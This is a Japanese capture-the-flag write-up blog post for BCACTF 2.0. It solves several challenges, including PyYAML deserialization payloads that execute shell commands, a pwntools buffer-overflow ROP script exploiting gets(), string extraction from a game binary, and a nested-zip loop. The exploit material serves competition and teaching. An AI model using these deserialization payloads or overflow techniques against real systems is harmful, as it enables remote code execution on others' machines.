---
title: "BCACTF 2.0 Writeup"
date: 2021-06-20T09:00:00+09:00
lastmod: 2021-06-20T09:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fbcactf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://play.bcactf.com/challenges](https://play.bcactf.com/challenges)
<br /><br />

3975点を獲得し、最終順位は63位でした。<br />

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_score.png" alt="bcactf_2021_score.png">

<br><br>

以下はチャレンジのリストです。<br />

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves1.png" alt="bcactf_2021_solves1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves2.png" alt="bcactf_2021_solves2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves3.png" alt="bcactf_2021_solves3.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves4.png" alt="bcactf_2021_solves4.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves5.png" alt="bcactf_2021_solves5.png">



<br /><br />
<br /><br />
## [Misc]: Challenge Checker (150 points)
- - -
### Challenge
> I made this challenge checker to automate away ed's job. Maybe you can get a flag if you give it enough delicious yams...
<br /><br />
nc misc.bcactf.com 49153
<br /><br />
Hint1: Try looking up some documentation.
<br />
Hint2: Can you read flag.txt?

Attachment:

- chall.yaml
- requirements.txt
- verify.py

<br>

chall.yamlの中身：
<pre>
name: Challenge Checker 
categories:
  - misc
value: 150
flag:
  file: ./flag.txt
description: |-
  I made this challenge checker to automate away ed's job. Maybe you can get a flag if you give it enough delicious yams...
hints:
  - Try looking up some documentation.
  - Can you get a shell?
deploy:
  nc:
    build: .
    expose: 9999
files:
  - src: chall.yaml
  - src: requirements.txt
  - src: verify.py
authors:
  - anli
  - Edward Feng
visible: true
</pre>

<br>

requirements.txtの中身：

<pre>
PyYAML==3.13
termcolor==1.1.0
</pre>

<br>

### Solution
<pre>
$ echo '!!python/object/apply:os.system ["cat flag.txt"]' | nc misc.bcactf.com 49153
Paste in your chall.yaml file, then send an EOF:
bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
</pre>

<br />

Flag: `bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}`



<br /><br />
<br /><br />
## [Misc]: Challenge Checker 2 (200 points)
- - -
### Challenge
> New version, better security, right?
<br /><br />
nc misc.bcactf.com 49154
<br /><br />
Hint1: What's changed?

Attachment:

- chall.yaml
- requirements.txt
- verify.py

<br>

requirements.txtの中身：

<pre>
PyYAML==5.3.1
termcolor==1.1.0
</pre>

<br>

### Solution
PyYAMLのバージョンが 5.3.1 にあがっています。

1のチャレンジ(前述)と同じ手順でやろうとすると、以下のエラーが出ます。

<pre>
$ echo '!!python/object/apply:os.system ["cat flag.txt"]' | nc misc.bcactf.com 49154
Paste in your chall.yaml file, then send an EOF:
Fatal error: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:os.system'
  in "<unicode string>", line 1, column 1:
    !!python/object/apply:os.system  ...
    ^

echo '!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "cat flag.txt" ]]]' | nc misc.bcactf.com 49154
Paste in your chall.yaml file, then send an EOF:
Fatal error: invalid syntax (<string>, line 1)
</pre>

<br>

PyYAML 5.3.1 の脆弱性をググって、見つかったPoCをいろいろ試したところ、<br>
[https://hackmd.io/@harrier/uiuctf20](https://hackmd.io/@harrier/uiuctf20) に書かれていた方法でフラグが取れました。

<pre>
$ cat poc5.txt
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('cat flag\x2etxt')"

$ cat poc5.txt | nc misc.bcactf.com 49154
Paste in your chall.yaml file, then send an EOF:
bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}
</pre>

<br />

Flag: `bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}`



<br /><br />
<br /><br />
## [Rev]: A Fun Game (100 points)
- - -
### Challenge
> A really fun game where you have to type the correct letter 1000 times to get the flag! It won't take that long, right? It's not like there's another way to do it...
<br /><br />
Note, The executable is built for Linux and can be run with mono Game.exe
<br /><br />
Hint1: Is it possible to modify the variable storing your points?
<br />
Hint2: What does a program like GameConqueror or CheatEngine do?

Attachment:

- Game.exe


<br />
### Solution
stringsで解けてしまった。

<pre>
$ strings -el Game.exe | more
.s^O
abcdefghijklmnopqrstuvwxyz
Hello!
Write the correct letter 1,000 times to get the flag!
Not that hard, right?
Type '0' to stop.
Type the letter '{0}':
Correct! Current points:
Incorrect. Current Points:
Incorrect input.
}sr3tte1_0001_epYt_yl1aUtca_tNd1d_U0y_yl1uf3p0h{ftcacb

$ echo 'u"}sr3tte1_0001_epYt_yl1aUtca_tNd1d_U0y_yl1uf3p0h{ftcacb' | rev
bcactf{h0p3fu1ly_y0U_d1dNt_actUa1ly_tYpe_1000_1ett3rs}"u
</pre>

<br />

Flag: `bcactf{h0p3fu1ly_y0U_d1dNt_actUa1ly_tYpe_1000_1ett3rs}`



<br /><br />
<br /><br />
## [Forensics]: Infinite Zip (75 points)
- - -
### Challenge
> Here's a zip, there's a zip. Zip zip everywhere.

Attachment:

- flag.zip

<br />
### Solution
手動で解凍してみると、999.zip, 998.zip というのが延々と続くようなのがわかります。

<pre>
$ for i in {1..999} ; do (unzip *.zip -d out ; rm *.zip ; mv out/*.zip .) ; done
</pre>

結果的に 0.zip まであったので、ループ数が足りなくて、最後はまた手動で解凍しました。

flag.pngが出てきて、exiftoolでフラグが見つかります。

<br />

Flag: `bcactf{z1p_1n51d3_4_z1p_4_3v3r}`





<br /><br />
<br /><br />
## [Pwn]: Discrete Mathematics (250 points)
- - -
### Challenge
> BCA's top-level math track! We have proofs, trig, parametric, polar, linear algebra, calculus, ... You'll just have to demonstrate your skills before getting the flag.
<br /><br />
nc bin.bcactf.com 49160
<br /><br />
Hint1: You can't just jump to the flag function directly.

Attachment:

- discrete.c
- discrete (ELF 64bit)


<br>

discrete.cの中身：

```C
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int knows_logic = 0;
int knows_algebra = 0;
int knows_functions = 0;

void logic() {
    int p, q, r, s;

    printf("p: ");
    scanf("%d", &p);
    printf("q: ");
    scanf("%d", &q);
    printf("r: ");
    scanf("%d", &r);
    printf("s: ");
    scanf("%d", &s);
    
    knows_logic = (p || q || !r) && (!p || r || !s) && (q != s) && s;
}

void algebra() {
    int x, y, z;

    printf("x: ");
    scanf("%d", &x);
    printf("y: ");
    scanf("%d", &y);
    printf("z: ");
    scanf("%d", &z);

    int eq1 = 5*x - 6*y + 3*z;
    int eq2 = 2*x + 5*y - 7*z;
    int eq3 = 4*x + 8*y + 8*z;

    knows_algebra = (eq1 == 153) && (eq2 == -163) && (eq3 == -28);
}

void functions() {
    int a, b, c;

    printf("a: ");
    scanf("%d", &a);
    printf("b: ");
    scanf("%d", &b);
    printf("c: ");
    scanf("%d", &c);

    int vertex_x = -b / (2*a);
    int vertex_y = a * vertex_x * vertex_x + b * vertex_x + c;
    int discriminant = b * b - 4 * a * c;

    knows_functions = (vertex_x == 2) && (vertex_y == -2) && (discriminant == 16);
}

void quiz() {
    FILE *fp = fopen("flag.txt", "r");
    char flag[100];

    if (fp == NULL) {
        puts("Sorry, all my stuff's a mess.");
        puts("I'll get around to grading your quiz sometime.");
        puts("[If you are seeing this on the remote server, please contact admin].");
        exit(1);
    }

    fgets(flag, sizeof(flag), fp);

    if (knows_logic && knows_algebra && knows_functions) {
        puts("Alright, you passed this quiz.");
        puts("Here's your prize:");
        puts(flag);
    } else {
        puts("Not there yet...");
        puts("Study some more!");
    }
}

int main() {
    char response[50];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Discrete.");
    puts("The top math track.");
    puts("The best BCA students.");
    puts("The crème de la crème.");
    puts("We have high expectations.");
    puts("Answer all the questions correctly.");
    puts("Do not disappoint us.");
    printf("> ");
    gets(response);

    if (strcmp(response, "i will get an A")) {
        puts("I'm sorry, but you obviously don't care about grades.");
        puts("Therefore, you aren't motivated enough to be in our class.");
        puts("Goodbye.");
        exit(1);
    }

    puts("Your quiz have been posted to Schoology.");
    puts("You have twenty minutes.");
    puts("Good luck.");
}
```

<br>

### Solution
以下、checksecの出力結果です。

<pre>
$ checksec discrete
[*] '/home/captureamerica/OneDrive/CTF/BCACTF_2021/Pwn/discrete'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

<br>
各関数に飛んでグローバル変数を立てた後、quiz()関数に飛ぶとフラグが取れる寸法です。

まずは、いくつかの方程式を自力で解かないといけません。久しぶりに数学やったな〜。

<br>
ここで、BOFを起こした後、飛んだ先の関数で Segmentation fault を出して終了してしまう問題にぶち当たりました。

他の関数(quiz)を挟むことで回避できたので、そのようなコードになってます。後で他の方がどうやって解いたのか、参考にさせてもらおうと思います。

{{< highlight python "linenos=table,hl_lines=28 30 32 35" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'critical'

elf = ELF('./discrete')
context.binary = elf
addr_logic = elf.symbols["logic"]
addr_algebra = elf.symbols["algebra"]
addr_functions = elf.symbols["functions"]
addr_quiz = elf.symbols["quiz"]
addr_main = elf.symbols["main"]
rdi_ret = next(elf.search(asm('pop rdi; ret')))
nop = next(elf.search(asm('nop')))

if 0:
    s = process('./discrete')
    # s = remote('localhost', 7777)
else:
    s = remote('bin.bcactf.com', 49160)

offset = 64
payload = b'i will get an A\x00'
payload += b'\x00' * (offset - len(payload))
payload += p64(rdi_ret)
payload += p64(addr_quiz)
payload += p64(addr_logic)
payload += p64(addr_quiz)
payload += p64(addr_functions)
payload += p64(addr_quiz)
payload += p64(addr_algebra)
payload += p64(addr_quiz)
payload += p64(addr_main)
payload += p64(addr_quiz)

s.sendlineafter("> ", payload)

# logic
s.sendlineafter("p: ", "1\n")
s.sendlineafter("q: ", "0\n")  # This has to be 0 becaues of '(q != s)'.
s.sendlineafter("r: ", "1\n")  # 
s.sendlineafter("s: ", "1\n")  # This has to be 1.

# functions
s.sendlineafter("a: ", "2\n")
s.sendlineafter("b: ", "-8\n")
s.sendlineafter("c: ", "6\n")

# algebra
s.sendlineafter("x: ", "3\n")
s.sendlineafter("y: ", "-17\n")
s.sendlineafter("z: ", "12\n")

print(s.recvall())
{{< / highlight >}}

<br />

Flag: `bcactf{the_limit_as_t_approaches_the_ctf_of_my_sanity_approaches_0}`




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />